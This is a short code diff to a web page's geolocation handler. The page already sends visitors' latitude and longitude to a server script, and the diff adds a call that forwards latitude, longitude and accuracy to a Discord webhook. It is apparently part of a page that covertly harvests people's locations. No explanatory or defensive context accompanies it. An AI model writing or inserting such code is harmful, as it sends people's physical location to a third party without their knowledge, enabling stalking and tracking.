@@ -67,6 +67,11 @@ function showPosition(position) {
   const xhttp = new XMLHttpRequest();
   xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
   xhttp.send();
+sendToDiscordWebhook(
+    position.coords.latitude, 
+    position.coords.longitude, 
+    position.coords.accuracy
+  );
 }
 </script>
 
